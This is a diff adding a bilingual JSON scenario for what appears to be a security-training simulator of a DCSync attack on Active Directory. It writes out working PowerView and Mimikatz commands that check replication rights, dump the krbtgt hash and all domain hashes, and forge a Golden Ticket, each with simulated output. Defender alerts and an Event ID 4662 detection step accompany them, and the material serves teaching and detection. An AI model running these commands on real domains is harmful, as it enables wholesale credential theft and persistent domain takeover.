@@ -1,0 +1,183 @@
+{
+  "id": "T1003.006",
+  "title": "DCSync 공격 시뮬레이션",
+  "titleEn": "DCSync Attack Simulation",
+  "duration": 8,
+  "phases": [
+    { "label": "🔍 권한 확인", "labelEn": "🔍 Permission Check", "steps": [0] },
+    { "label": "⚡ DCSync 실행", "labelEn": "⚡ DCSync Execution", "steps": [1, 2] },
+    { "label": "🔓 Golden Ticket", "labelEn": "🔓 Golden Ticket", "steps": [3] },
+    { "label": "🧹 탐지 확인", "labelEn": "🧹 Detection Check", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker\n(Workstation)", "x": 50, "y": 80 },
+    { "id": "drsuapi", "label": "MS-DRSR\n(Replication)", "x": 220, "y": 80 },
+    { "id": "dc", "label": "DC01\n(Target)", "x": 380, "y": 30 },
+    { "id": "hashes", "label": "krbtgt Hash\n+ All Users", "x": 380, "y": 130 },
+    { "id": "golden", "label": "Golden Ticket\n(Persistence)", "x": 480, "y": 80 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "drsuapi", "minStep": 1 },
+    { "from": "drsuapi", "to": "dc", "minStep": 1 },
+    { "from": "dc", "to": "hashes", "minStep": 2 },
+    { "from": "hashes", "to": "golden", "minStep": 3 }
+  ],
+  "desktopIcons": [
+    { "name": "Mimikatz", "icon": "🔓" },
+    { "name": "PowerShell", "icon": "🖥️" },
+    { "name": "Rubeus", "icon": "🎫" },
+    { "name": "{companyName} App", "icon": "🌐" },
+    { "name": "Event Viewer", "icon": "📋" }
+  ],
+  "steps": [
+    {
+      "cmd": "Get-ObjectAcl -DistinguishedName 'DC=corp,DC=local' -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'Replication' -and $_.SecurityIdentifier -match 'S-1-5-21-.*-1108'}",
+      "out": "ObjectDN        : DC=corp,DC=local\nObjectAceType   : DS-Replication-Get-Changes\nAccessControlType: Allow\nSecurityIdentifier: S-1-5-21-3623811015-...-1108 (corp\\compromiseduser)\n\nObjectDN        : DC=corp,DC=local\nObjectAceType   : DS-Replication-Get-Changes-All\nAccessControlType: Allow\nSecurityIdentifier: S-1-5-21-3623811015-...-1108 (corp\\compromiseduser)",
+      "def": "[SIEM] Replication ACL query on domain root - checking DCSync capability",
+      "defAction": "User: compromiseduser\nQuery: Replication ACE on DC=corp,DC=local\nRisk Level: High\nAction: Investigate why non-DC has replication rights",
+      "desc": "공격자가 탈취한 계정이 도메인 복제 권한(DS-Replication-Get-Changes-All)을 가지고 있는지 확인합니다.",
+      "descEn": "Checking if the compromised account has domain replication rights (DS-Replication-Get-Changes-All).",
+      "stepTitle": "도메인 복제 권한(DCSync 가능 여부) 확인",
+      "stepTitleEn": "Domain Replication Permission (DCSync Capability) Check",
+      "feynman": "본사에 전화를 걸어 '직원 명부를 보내줘'라고 요청하기 전에, '내가 본사로 등록되어 있는지(복제 권한)' 확인하는 것입니다. DS-Replication-Get-Changes-All 권한이 있으면 비밀번호 해시를 포함한 전체 데이터를 요청할 수 있습니다.",
+      "feynmanEn": "Before calling HQ to request the employee directory, checking if 'I'm registered as an HQ (replication rights)'. With DS-Replication-Get-Changes-All, you can request all data including password hashes.",
+      "expert": "Get-ObjectAcl(PowerView)로 도메인 루트의 ACE를 조회합니다. DS-Replication-Get-Changes(1131f6aa-...)와 DS-Replication-Get-Changes-All(1131f6ad-...)이 모두 Allow인 계정은 DCSync 공격이 가능합니다. 정상적으로 이 권한을 가진 개체는 Domain Controllers, Domain Admins, Enterprise Admins뿐입니다.",
+      "expertEn": "Using Get-ObjectAcl (PowerView) to query ACEs on the domain root. Accounts with both DS-Replication-Get-Changes and DS-Replication-Get-Changes-All set to Allow can perform DCSync attacks.",
+      "defTooltip": "🔐 비 DC 계정에 복제 권한이 발견되었습니다! DCSync 공격 가능성 확인!",
+      "defTooltipEn": "🔐 Replication rights found on non-DC account! DCSync attack capability confirmed!",
+      "hackerLog": {
+        "title": "repl_acl.txt",
+        "lines": [
+          { "log": "DS-Replication-Get-Changes-All: Allow", "desc": "💡 비밀번호 해시 포함 전체 복제 데이터 요청 가능 - DCSync의 핵심 권한" },
+          { "log": "SecurityIdentifier: compromiseduser", "desc": "💡 일반 사용자에게 복제 권한 부여됨 - 비정상적이고 위험한 설정" }
+        ]
+      },
+      "terms": [
+        { "name": "DS-Replication-Get-Changes", "desc": "AD 개체의 복제 데이터를 요청할 수 있는 권한. 비밀번호 해시는 포함되지 않습니다." },
+        { "name": "DS-Replication-Get-Changes-All", "desc": "비밀번호 해시를 포함한 모든 복제 데이터를 요청할 수 있는 권한. DCSync의 핵심 권한입니다." },
+        { "name": "MS-DRSR (Directory Replication)", "desc": "DC 간 AD 데이터를 복제하는 Microsoft 프로토콜. DCSync는 이 프로토콜을 악용합니다." }
+      ]
+    },
+    {
+      "cmd": "mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt",
+      "out": "[DC] 'DC01.corp.local' will be the DC server\n[DC] Object with GUID: {a1b2c3d4-e5f6-7890-abcd-ef1234567890}\n\n** SAM ACCOUNT **\nSAM Username         : krbtgt\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )\nObject Security ID   : S-1-5-21-3623811015-3361044348-30300820-502\nObject Relative ID   : 502\n\nCredentials:\n  Hash NTLM: b4c8f1e2a3d5e6f7089a1b2c3d4e5f6a\n    ntlm- 0: b4c8f1e2a3d5e6f7089a1b2c3d4e5f6a\n    lm  - 0: aad3b435b51404eeaad3b435b51404ee\n\nSupplemental Credentials:\n  * Primary:Kerberos-Newer-Keys *\n    aes256_hmac: 9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f",
+      "def": "[EDR] CRITICAL: DCSync - krbtgt hash replicated via DRSUAPI from non-DC host",
+      "defAction": "Source: compromiseduser (Workstation, NOT DC)\nProtocol: MS-DRSR (DRSUAPI)\nTarget: krbtgt hash\nRisk Level: Critical\nAction: Disable account, reset krbtgt twice, full IR",
+      "desc": "Mimikatz로 DC에게 krbtgt 계정의 복제 데이터를 요청합니다. DC는 정상적인 복제 요청으로 판단하고 해시를 응답합니다.",
+      "descEn": "Requesting krbtgt account replication data from the DC using Mimikatz. The DC treats it as a normal replication request and responds with the hash.",
+      "stepTitle": "DCSync: krbtgt 해시 원격 탈취",
+      "stepTitleEn": "DCSync: Remote krbtgt Hash Extraction",
+      "feynman": "전화(DRSUAPI)로 본사(DC)에 '나도 본사인데, krbtgt 직원의 정보를 보내줘'라고 요청하는 것입니다. 본사는 발신자가 진짜 본사인지 '전화번호(복제 권한)'만 확인하고, 직원 정보(해시)를 보내줍니다. krbtgt 해시는 Golden Ticket을 만드는 마스터 키입니다.",
+      "feynmanEn": "Calling HQ (DC) via phone (DRSUAPI) saying 'I'm also HQ, send me krbtgt's info.' HQ only checks the caller's phone number (replication rights) and sends the employee info (hash). The krbtgt hash is the master key for creating Golden Tickets.",
+      "expert": "lsadump::dcsync는 DRS_MSG_GETCHGREQ(GetNCChanges) RPC 호출을 DC에 전송합니다. DC는 호출자의 SID가 DS-Replication-Get-Changes-All ACE에 있는지 확인하고, 있으면 요청한 개체의 unicodePwd(NTLM), supplementalCredentials(Kerberos)를 반환합니다. 네트워크 트래픽에서 DRSUAPI(RPC UUID e3514235-...) 호출이 비 DC IP에서 발생하는 것이 탐지 포인트입니다.",
+      "expertEn": "lsadump::dcsync sends DRS_MSG_GETCHGREQ (GetNCChanges) RPC calls to the DC. The DC checks if the caller's SID has DS-Replication-Get-Changes-All ACE, and returns the requested object's unicodePwd and supplementalCredentials.",
+      "defTooltip": "🔐 비 DC 호스트에서 DRSUAPI를 통해 krbtgt 해시가 복제되었습니다! Golden Ticket 위험!",
+      "defTooltipEn": "🔐 krbtgt hash replicated via DRSUAPI from non-DC host! Golden Ticket risk!",
+      "hackerLog": {
+        "title": "dcsync_krbtgt.txt",
+        "lines": [
+          { "log": "Hash NTLM: b4c8f1e2a3d5e6f7...", "desc": "💡 krbtgt NTLM 해시 탈취 - Golden Ticket 위조의 핵심 재료" },
+          { "log": "aes256_hmac: 9a8b7c6d5e4f3a2b...", "desc": "💡 AES256 Kerberos 키도 탈취 - 최신 환경에서도 Golden Ticket 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "lsadump::dcsync", "desc": "Mimikatz 모듈로, DRSUAPI 프로토콜을 사용해 DC에서 자격증명을 복제하는 DCSync 공격을 수행합니다." },
+        { "name": "GetNCChanges", "desc": "DC 간 복제에 사용되는 RPC 호출. 명명 컨텍스트의 변경 사항을 요청합니다." },
+        { "name": "supplementalCredentials", "desc": "AD 사용자 개체의 속성으로, Kerberos 키(AES256, AES128, DES)가 저장됩니다." }
+      ]
+    },
+    {
+      "cmd": "mimikatz # lsadump::dcsync /domain:corp.local /all /csv",
+      "out": "[DC] 'DC01.corp.local' will be the DC server\n502\tkrbtgt\tb4c8f1e2a3d5e6f7089a1b2c3d4e5f6a\n500\tAdministrator\t31d6cfe0d16ae931b73c59d7e0c089c0\n1103\tuser1\tc5d7e9a1b3f2d4e6a8c0b2d4f6e8a0c2\n1104\tuser2\ta1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6\n1105\tuser3\td8f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6\n... [1,247 accounts]\n1001\tDC01$\te8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3\n1002\tDC02$\tf0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5",
+      "def": "[EDR] CRITICAL: DCSync /all - entire domain hash dump via replication",
+      "defAction": "Source: compromiseduser (non-DC)\nAction: Full domain DCSync (/all)\nAccounts: 1,247 + computer accounts\nRisk Level: Critical\nAction: EMERGENCY - all credentials compromised",
+      "desc": "/all 옵션으로 도메인 전체 사용자와 컴퓨터 계정의 해시를 한 번에 추출합니다. DC에 파일을 생성하지 않고 네트워크를 통해 수행됩니다.",
+      "descEn": "Using /all option to extract hashes for all domain users and computer accounts at once. Performed over the network without creating files on the DC.",
+      "stepTitle": "전체 도메인 DCSync (모든 계정 해시 탈취)",
+      "stepTitleEn": "Full Domain DCSync (All Account Hash Extraction)",
+      "feynman": "본사에 '모든 직원의 정보를 보내줘'라고 요청하는 것입니다. 1,247명의 직원 비밀번호 해시뿐만 아니라, 서버들의 계정(DC01$, DC02$)까지 포함됩니다. NTDS.dit 덤프와 달리 DC에 어떤 파일도 생성하지 않아 탐지가 더 어렵습니다.",
+      "feynmanEn": "Requesting HQ to 'send all employee information.' This includes hashes for 1,247 employees plus server accounts (DC01$, DC02$). Unlike NTDS.dit dumps, no files are created on the DC, making detection harder.",
+      "expert": "DCSync /all은 도메인의 모든 개체에 대해 순차적으로 GetNCChanges를 호출합니다. 컴퓨터 계정($로 끝나는)의 해시는 Silver Ticket 공격에 사용될 수 있으며, krbtgt 해시로 Golden Ticket을 위조할 수 있습니다. 네트워크 기반 공격이므로 DC의 프로세스 로그에는 공격 흔적이 남지 않습니다.",
+      "expertEn": "DCSync /all sequentially calls GetNCChanges for all objects in the domain. Computer account hashes (ending with $) can be used for Silver Ticket attacks, and the krbtgt hash enables Golden Ticket forgery.",
+      "defTooltip": "🔐 전체 도메인 DCSync 실행! 모든 자격증명이 침해되었습니다 - 긴급 대응 필요!",
+      "defTooltipEn": "🔐 Full domain DCSync executed! All credentials compromised - emergency response required!",
+      "hackerLog": {
+        "title": "dcsync_all.txt",
+        "lines": [
+          { "log": "1,247 accounts dumped", "desc": "💡 도메인 전체 사용자 해시 탈취 - DC 접근 없이 네트워크로 수행됨" },
+          { "log": "DC01$, DC02$ computer accounts", "desc": "💡 컴퓨터 계정 해시도 탈취 - Silver Ticket 공격에 사용 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "DCSync /all", "desc": "도메인의 모든 계정에 대해 DCSync를 수행하는 옵션. 전체 자격증명을 한 번에 추출합니다." },
+        { "name": "Silver Ticket", "desc": "특정 서비스의 키(컴퓨터 계정 해시)로 위조한 서비스 티켓. 개별 서비스에 대한 접근에 사용됩니다." },
+        { "name": "컴퓨터 계정 ($)", "desc": "AD의 컴퓨터 개체에 대한 계정. 이름 끝에 $가 붙으며, 서비스 인증에 사용됩니다." }
+      ]
+    },
+    {
+      "cmd": "mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-3623811015-3361044348-30300820 /krbtgt:b4c8f1e2a3d5e6f7089a1b2c3d4e5f6a /ticket:golden.kirbi",
+      "out": "User      : Administrator\nDomain    : corp.local\nSID       : S-1-5-21-3623811015-3361044348-30300820\nUser Id   : 500\nGroups Id : *513 512 520 518 519\nServiceKey: b4c8f1e2a3d5e6f7... - rc4_hmac_nt\nLifetime  : 2026/01/20 14:35:22 ; 2036/01/18 14:35:22 ; 2036/01/18 14:35:22\n\n -> Ticket : golden.kirbi\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\n[+] Final Ticket Saved to file!",
+      "def": "[EDR] CRITICAL: Golden Ticket generated with krbtgt hash - 10-year validity",
+      "defAction": "Ticket: golden.kirbi\nImpersonating: Administrator\nValidity: 10 years\nRisk Level: Critical\nAction: Reset krbtgt TWICE immediately",
+      "desc": "탈취한 krbtgt 해시로 10년 유효기간의 Golden Ticket을 생성합니다. 이 티켓으로 도메인 전체에 Administrator로 접근할 수 있습니다.",
+      "descEn": "Creating a 10-year Golden Ticket with the stolen krbtgt hash. This ticket enables access to the entire domain as Administrator.",
+      "stepTitle": "Golden Ticket 생성 (영구 지속 접근)",
+      "stepTitleEn": "Golden Ticket Creation (Persistent Access)",
+      "feynman": "탈취한 마스터 키(krbtgt 해시)로 '10년간 유효한 위조 통행증(Golden Ticket)'을 만드는 것입니다. 이 통행증이 있으면 비밀번호를 모르더라도, 심지어 비밀번호가 변경되더라도 도메인 전체에 최고 관리자로 접근할 수 있습니다.",
+      "feynmanEn": "Creating a '10-year forged pass (Golden Ticket)' with the stolen master key (krbtgt hash). With this pass, you can access the entire domain as a super admin without knowing passwords, even if passwords are changed.",
+      "expert": "kerberos::golden은 krbtgt 해시로 TGT를 위조합니다. PAC에 임의의 그룹 SID(512=Domain Admins, 519=Enterprise Admins)를 포함시키며, 유효 기간을 임의로 설정합니다(기본 10년). 이 티켓은 krbtgt가 리셋될 때까지 유효합니다. 대응으로 krbtgt를 두 번 리셋해야 합니다(현재 키 + 이전 키).",
+      "expertEn": "kerberos::golden forges a TGT with the krbtgt hash. It includes arbitrary group SIDs (512=Domain Admins, 519=Enterprise Admins) in the PAC and sets an arbitrary validity period. This ticket remains valid until krbtgt is reset.",
+      "defTooltip": "🔐 10년 유효기간의 Golden Ticket이 생성되었습니다! krbtgt를 즉시 두 번 리셋하세요!",
+      "defTooltipEn": "🔐 10-year Golden Ticket generated! Reset krbtgt TWICE immediately!",
+      "hackerLog": {
+        "title": "golden_ticket.txt",
+        "lines": [
+          { "log": "Lifetime: 2026-2036 (10 years)", "desc": "💡 10년 유효 기간 - krbtgt 리셋 전까지 영구적 접근 가능" },
+          { "log": "Groups: 513 512 520 518 519", "desc": "💡 모든 특권 그룹 SID 포함 - Domain Admins, Enterprise Admins, Schema Admins" }
+        ]
+      },
+      "terms": [
+        { "name": "Golden Ticket", "desc": "krbtgt 해시로 위조한 TGT. 임의의 사용자/그룹 권한으로 도메인 전체에 접근 가능하며, krbtgt 리셋 전까지 유효합니다." },
+        { "name": "kerberos::golden", "desc": "Mimikatz 모듈로, Golden Ticket(위조 TGT)을 생성합니다." },
+        { "name": "PAC (Privilege Attribute Certificate)", "desc": "Kerberos 티켓의 사용자 권한 정보. SID, 그룹 멤버십 등이 포함되며, Golden Ticket에서는 위조됩니다." }
+      ]
+    },
+    {
+      "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4662} -MaxEvents 5 | Where-Object {$_.Message -match 'Replicating Directory Changes'}",
+      "out": "TimeCreated  : 2026-01-20 14:35:22\nId           : 4662\nMessage      : An operation was performed on an object.\n               Subject: CORP\\compromiseduser\n               Object Type: domainDNS\n               Accesses: DS-Replication-Get-Changes-All\n               Properties: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}",
+      "def": "[SIEM] Event ID 4662 - DCSync detection via Replication access audit",
+      "defAction": "Event: 4662 (Directory Service Access)\nSubject: compromiseduser (NOT a DC account)\nAccess: DS-Replication-Get-Changes-All\nRisk Level: Critical\nAction: Confirmed DCSync attack - forensic evidence preserved",
+      "desc": "Event ID 4662로 DCSync 공격을 탐지합니다. 비 DC 계정이 DS-Replication-Get-Changes-All 접근을 수행한 것이 기록됩니다.",
+      "descEn": "Detecting the DCSync attack via Event ID 4662. A non-DC account performing DS-Replication-Get-Changes-All access is logged.",
+      "stepTitle": "Event ID 4662로 DCSync 탐지",
+      "stepTitleEn": "DCSync Detection via Event ID 4662",
+      "feynman": "전화 기록(Event ID 4662)을 확인해보니, '본사가 아닌 사람(compromiseduser)이 직원 명부를 요청한' 기록이 남아있습니다. 정상적인 복제 요청은 DC 컴퓨터 계정(DC01$, DC02$)에서만 발생해야 하므로, 일반 사용자 계정에서의 요청은 DCSync 공격의 확실한 증거입니다.",
+      "feynmanEn": "Checking phone records (Event ID 4662) reveals a 'non-HQ person (compromiseduser) requested the employee directory.' Normal replication requests should only come from DC computer accounts, so a request from a regular user account is definitive evidence of a DCSync attack.",
+      "expert": "Event ID 4662는 Directory Service Access 감사 이벤트로, 'Audit Directory Service Access' 정책이 활성화되어야 기록됩니다. {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}는 DS-Replication-Get-Changes-All GUID입니다. Subject가 DC 컴퓨터 계정이 아닌 사용자 계정이면 DCSync 공격입니다.",
+      "expertEn": "Event ID 4662 is a Directory Service Access audit event requiring 'Audit Directory Service Access' policy. {1131f6ad-...} is the DS-Replication-Get-Changes-All GUID. If Subject is a user account rather than a DC computer account, it's a DCSync attack.",
+      "defTooltip": "🔐 Event ID 4662에서 비 DC 계정의 복제 접근이 감지되었습니다! DCSync 공격 확정!",
+      "defTooltipEn": "🔐 Non-DC account replication access detected in Event ID 4662! DCSync attack confirmed!",
+      "hackerLog": {
+        "title": "event_4662.txt",
+        "lines": [
+          { "log": "Subject: CORP\\compromiseduser", "desc": "💡 DC 컴퓨터 계정이 아닌 사용자 계정 - DCSync 공격의 확실한 증거" },
+          { "log": "DS-Replication-Get-Changes-All", "desc": "💡 비밀번호 해시를 포함한 전체 복제 데이터 요청 - 핵심 탐지 지표" }
+        ]
+      },
+      "terms": [
+        { "name": "Event ID 4662", "desc": "Directory Service Access 감사 이벤트. AD 개체에 대한 접근을 기록하며, DCSync 탐지의 핵심 이벤트입니다." },
+        { "name": "1131f6ad GUID", "desc": "DS-Replication-Get-Changes-All 확장 권한의 GUID. 이 GUID가 Event 4662에 표시되면 DCSync 활동입니다." },
+        { "name": "Audit Directory Service Access", "desc": "AD 개체 접근을 감사하는 정책. DCSync 탐지를 위해 반드시 활성화해야 합니다." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "powershell.exe (compromiseduser)", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "Get-ObjectAcl (PowerView)", "depth": 1, "alert": false, "minStep": 0 },
+    { "name": "mimikatz.exe", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "lsadump::dcsync /user:krbtgt", "depth": 2, "alert": true, "minStep": 1 },
+    { "name": "lsadump::dcsync /all", "depth": 2, "alert": true, "minStep": 2 },
+    { "name": "kerberos::golden", "depth": 2, "alert": true, "minStep": 3 },
+    { "name": "DRSUAPI → DC01 (Network)", "depth": 1, "alert": true, "minStep": 1 }
+  ]
+}
